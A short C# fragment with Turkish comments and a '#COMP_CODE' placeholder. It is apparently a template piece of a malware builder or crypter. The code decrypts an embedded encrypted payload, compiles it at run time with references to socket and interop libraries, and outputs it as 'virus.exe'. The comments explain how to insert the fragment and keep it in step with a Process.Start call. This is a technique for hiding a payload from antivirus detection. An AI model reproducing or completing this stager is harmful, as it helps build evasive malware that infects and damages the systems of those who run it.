// #COMP_CODE
// Etiketi bir fonksiyon yada method i�erisine yerle�tiriniz. �smini de�i�tirseniz Process.Start kodundada de�i�tiriniz. Lokasyon de�i�tirilebilir.
CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
CodeDomProvider.IsDefinedLanguage("CSharp");
CompilerParameters parameters = new CompilerParameters(new string[] { "System.dll", "System.Drawing.dll", "System.Net.Sockets.dll", "System.Windows.Forms.dll", "System.Threading.Tasks.dll", "System.Net.dll", "System.Net.Sockets.dll", "System.Runtime.InteropServices.dll", "System.Threading.dll" });
parameters.GenerateExecutable = true;
parameters.OutputAssembly     = "virus.exe"; 
parameters.GenerateInMemory   = true; 
CompilerResults results = provider.CompileAssemblyFromSource(parameters, Decrypt(payloadCryptoCode));